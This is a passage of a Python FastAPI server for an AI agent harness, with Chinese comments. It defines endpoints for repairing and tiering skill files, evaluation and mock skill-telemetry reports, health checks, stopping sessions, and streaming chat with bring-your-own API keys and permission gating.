        return {"available": False, "why": "文件不在允许的 skills 目录内（仅支持 .evoharness/skills 下的 .md）"}
    suggestion = build_repair_suggestion(req.file, req.event, req.reason)
    return suggestion


@app.post("/api/skills/repair/apply")
async def repair_apply(req: RepairRequest, request: Request):
    from agents.skill_repair import apply_repair, _classify

    denied = _require_hosted_admin(request)
    if denied:
        return JSONResponse(status_code=401, content=denied)
    if not _is_allowed_repair_file(req.file):
        return {"ok": False, "error": "文件不在允许的 skills 目录内（仅支持 .evoharness/skills 下的 .md）"}
    kind = _classify(req.event, req.reason)
    result = apply_repair(req.file, kind)
    if result.get("ok"):
        # 修复成功后刷新 skill 缓存，让新文件立即进入检索语料。
        # 刷新失败必须回传：否则用户看到"修复成功"却要重启才生效（状态不一致）。
        try:
            from agents.skills import reset_skill_cache

            reset_skill_cache()
        except Exception as error:  # noqa: BLE001
            detail = f"{type(error).__name__}: {error}"[:200]
            result["cacheRefreshError"] = detail
            result["hint"] = "修复已写入磁盘但缓存未刷新，需重启服务才会生效"
            print(f"[repair] cache refresh failed: {detail}")
    return result


# ---------------------------------------------------------------------------
# 部署分区：experimental/staging/core 观测 + 人工操作（promote/rollback/core）
# ---------------------------------------------------------------------------

class TierActionRequest(BaseModel):
    skill: str
    action: str  # promote | rollback | core


@app.get("/api/skills/tiers")
async def skills_tiers_overview():
    """分区现状表 + 最近审计行（Skills 观测台展示阶段状态的最小接入）。"""
    from agents.skill_tiers import get_tier_map, tier_audit_path

    audit: list[dict] = []
    path = tier_audit_path()
    if path.is_file():
        for line in path.read_text(encoding="utf-8", errors="replace").splitlines()[-50:]:
            if not line.strip():
                continue
            try:
                row = json.loads(line)
            except Exception:
                continue
            if isinstance(row, dict):
                audit.append(row)
    return {"tiers": get_tier_map(), "audit": audit}


@app.post("/api/skills/tiers/action")
async def skills_tier_action(req: TierActionRequest, request: Request):
    """manual_promote（实验区→预发，卡实验区修订版的释放阀）/ 一键回退（预发→实验区）/ core 晋级。

    注意与 repair 端点不同：tier 是运行时 mtime 动态读，不需要 reset_skill_cache。
    hosted 模式下为管理写端点：必须带认证（W08）；普通用户不能晋级 core。
    """
    from agents import skill_tiers

    denied = _require_hosted_admin(request)
    if denied:
        return JSONResponse(status_code=401, content=denied)
    action = str(req.action or "").strip().lower()
    if action == "promote":
        return skill_tiers.manual_promote(req.skill)
    if action == "rollback":
        return skill_tiers.rollback(req.skill)
    if action == "core":
        return skill_tiers.manual_promote_core(req.skill)
    return {"ok": False, "error": f"unknown action: {req.action}"}


# ---------------------------------------------------------------------------
# Evaluation：静态 Memory Benchmark 报告 + 实时 Skill Telemetry
# ---------------------------------------------------------------------------

EVAL_RESULTS_PATH = ROOT / "frontend" / "eval_results.json"

MOCK_SKILL_TELEMETRY = [
    {
        "skill": "webnovel-writing", "status": "incubating",
        "retrieved": 6, "relevant": 0, "used": 0,
        "used_rate": 0.0, "relevance_rate": 0.0,
        "last_reason": "Skill is for writing Chinese web novels, but the user request is about reading a PDF.",
        "last_promotion": {"decision": "discard", "reason": "retrieval evidence insufficient: 6 retrieved, 0 relevant", "time": "2026-09-10T08:12:00Z"},
    },
    {
        "skill": "code-review-checklist", "status": "watch",
        "retrieved": 21, "relevant": 13, "used": 7,
        "used_rate": 0.33, "relevance_rate": 0.62,
        "last_reason": "User asked for a refactor review; checklist applied with 9/11 items.",
        "last_promotion": {"decision": "merge", "reason": "rule extracted from explicit user feedback, merged v3 -> v4", "time": "2026-09-11T14:40:00Z"},
    },
    {
        "skill": "api-mock-contract", "status": "healthy",
        "retrieved": 18, "relevant": 14, "used": 9,
        "used_rate": 0.5, "relevance_rate": 0.78,
        "last_reason": "Contract-first mock generation matched the request; tests generated and passed.",
        "last_promotion": {"decision": "add", "reason": "new reusable rule from feedback, promoted to healthy after replay 3/3", "time": "2026-09-12T02:05:00Z"},
    },
]


@app.get("/api/eval/report")
async def eval_report():
    """静态 Memory Benchmark（LoCoMo）报告。"""
    data = _read_json_file(EVAL_RESULTS_PATH)
    if not data:
        return {"has_data": False}
    return {"has_data": True, **data}


@app.get("/api/eval/skills")
async def eval_skills():
    """实时 Skill 遥测：状态、使用率与最近一次 promotion 决策。

    优先读真实评测审计产物；无产物（公开演示环境）回退 mock 数据。
    """
    report = _read_json_file(EVOLUTION_DIR / "online_eval_report.json")
    usage_stats = _read_json_file(EVOLUTION_DIR / "skill_usage_stats.json") or {}
    if report and report.get("skills"):
        out = []
        for item in report["skills"]:
            name = str(item.get("skill") or "")
            usage = usage_stats.get(name, {}) if isinstance(usage_stats, dict) else {}
            last_action = str(item.get("last_action") or "")
            out.append({
                "skill": name,
                "status": str(item.get("status") or ""),
                "retrieved": int(item.get("retrieved", 0) or 0),
                "relevant": int(item.get("relevant", 0) or 0),
                "used": int(item.get("used", 0) or 0),
                "used_rate": float(item.get("used_rate", 0.0) or 0.0),
                "relevance_rate": float(item.get("relevance_rate", 0.0) or 0.0),
                "last_reason": str(usage.get("last_reason") or "")[:200],
                "last_promotion": {
                    "decision": last_action or "none",
                    "reason": "; ".join(item.get("reasons") or [])[:200],
                    "time": str(item.get("last_time") or ""),
                },
            })
        return {"mock": False, "skills": out}
    return {"mock": True, "skills": MOCK_SKILL_TELEMETRY}


@app.get("/api/health")
async def health():
    return {
        "ok": True,
        "model": MODEL,
        "protocol": "openai-compatible" if USE_OPENAI else "anthropic",
        "sessions": len(AGENTS),
        # 服务端是否自带模型配置（false = 纯 BYOK 部署，要求用户在前端填 key）
        "server_configured": bool(API_KEY),
        # 服务端共享额度是否「默认」可用（false = 有配置但不回落，用户仍须自带 key）。
        # 语义拆分：server_configured 只说"有共享额度"，server_key_default 才说"默认会用"。
        "server_key_default": bool(ALLOW_SERVER_KEY and API_KEY),
    }


@app.post("/api/stop")
async def stop(req: StopRequest, request: Request):
    _reject_unsafe_session_id(req.session_id)
    # hosted 模式：stop 属于跨 session 管理动作（A 主体不能停 B 主体的会话），需要认证。
    denied = _require_hosted_admin(request, session_id=req.session_id)
    if denied:
        return JSONResponse(status_code=401, content=denied)
    agent = AGENTS.get(req.session_id)
    if agent:
        agent.abort()
        return {"ok": True}
    return {"ok": False}


@app.post("/api/chat")
async def chat(req: ChatRequest, request: Request):
    session_id = req.session_id
    _reject_unsafe_session_id(session_id)
    LOCKS.setdefault(session_id, asyncio.Lock())
    lock = LOCKS[session_id]

    # 请求期按真实绑定地址修正自动批准（修复 uvicorn --host 0.0.0.0 与 BIND_HOST 脱节）
    auto_confirm_on = _effective_auto_confirm(request.scope.get("server"))

    queue: asyncio.Queue = asyncio.Queue()
    token = _current_queue.set(queue)

    async def live_stream():
        started = time.time()
        req_key = (req.api_key or "").strip()
        # 本地/回环 api_base（如本地 Ollama）通常免 key：允许不带 key（EVOHARNESS_ALLOW_LOCAL_NO_KEY 可关）。
        local_base = LOCAL_NO_KEY_OK and _is_local_api_base((req.api_base or "").strip() or API_BASE)
        if not req_key and not (ALLOW_SERVER_KEY and API_KEY) and not local_base:
            # BYOK 缺失且未显式开启服务端共享额度回落：拒绝，不静默计费服务端 key
            if API_KEY and not ALLOW_SERVER_KEY:
                reason = "服务端已配置共享额度，但默认不再回落使用（EVOHARNESS_ALLOW_SERVER_KEY=1 可显式开启）"
            else:
                reason = "服务端未配置模型 key"
            yield _sse({"type": "error", "data": f"未配置模型 API key：点击左下角「模型设置」填入你自己的 API 配置（{reason}）"})
            yield _sse({"type": "end"})
            return
        yield _sse({"type": "start", "model": (req.model or "").strip() or MODEL})
        # 对外/通配绑定判定（与 auto_confirm 修正同源）：用于 acceptEdits 的安全门降级
        _server = request.scope.get("server")
        exposed_bind = _is_exposed_bind(
            _server[0] if isinstance(_server, (tuple, list)) and _server else None
        )
        mode = _gate_permission_mode(_safe_permission_mode(req.permission_mode),
                                     auto_confirm_on, exposed_bind)
        try:
            async with lock:
                RUNNING[session_id] = True
                agent = _get_agent(session_id, mode, req.api_base, req.api_key, req.model,
                                   auto_confirm_enabled=auto_confirm_on)
                chat_task = asyncio.create_task(agent.chat(req.message))
                while True:
                    get_event = asyncio.create_task(queue.get())
                    done, _ = await asyncio.wait(
                        {get_event, chat_task}, return_when=asyncio.FIRST_COMPLETED
                    )
                    if get_event.done() and not get_event.cancelled():
                        yield _sse(get_event.result())
                    elif not get_event.done():
                        get_event.cancel()
                    if chat_task.done():
                        break
                    while not queue.empty():
                        yield _sse(queue.get_nowait())
                try:
                    await chat_task
                except Exception as error:  # noqa: BLE001
                    yield _sse({"type": "error", "data": f"{type(error).__name__}: {error}"})
                yield _sse({
                    "type": "done",
                    "tokens": agent.get_token_usage(),
                    "turns": agent.current_turns,
                    "elapsed": round(time.time() - started, 1),
                    # 会话保存失败必须让前端可见（脱敏原因，不含路径以外的隐私）。
                    # 旧实现把保存异常静默吞掉，用户只会觉得"历史莫名丢了"。
                    "saveError": getattr(agent, "last_save_error", "") or "",
                })
        finally:
            RUNNING[session_id] = False
            try:
                _current_queue.reset(token)
            except ValueError:
                # agent.chat 的后台任务可能切换了 asyncio Context，导致 token
                # 无法在当前 Context 中 reset；直接清空当前值即可。
                _current_queue.set(None)
            while not queue.empty():
                yield _sse(queue.get_nowait())
            yield _sse({"type": "end"})

    return StreamingResponse(
        live_stream(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


def _sse(payload: dict) -> str:
    return f"data: {json.dumps(payload, ensure_ascii=False)}\n\n"


@app.get("/")
async def index():
    return FileResponse(ROOT / "frontend" / "index.html")


if __name__ == "__main__":
    import uvicorn

    # 部署平台通过 PORT 注入端口（默认 7860），本地默认 8800。
    # 绑定地址可通过 EVOHARNESS_HOST（优先）或 HOST 指定；容器/部署（PORT 存在或
    # Docker 的 ENV HOST=0.0.0.0）保留对外绑定，本地裸跑默认只绑 127.0.0.1。
    # （BIND_HOST 已在导入时解析；AUTO_CONFIRM 默认值随之确定，见文件上方安全开关）
    # 本地开发默认热重载：改动 agents/、server/ 下的 .py 或根目录 .env 自动重启生效；
    # 设 EVO_RELOAD=0 关闭（生产/部署容器内建议关闭）。
    host = BIND_HOST
    dev_reload = os.environ.get("EVO_RELOAD", "1") == "1" and not os.environ.get("PORT")
    uvicorn.run(
        "server.app:app",
        host=host,
        port=int(os.environ.get("PORT", "8800")),
        reload=dev_reload,
        reload_dirs=str(ROOT) if dev_reload else None,
        reload_includes=["*.py", ".env"] if dev_reload else None,
    )
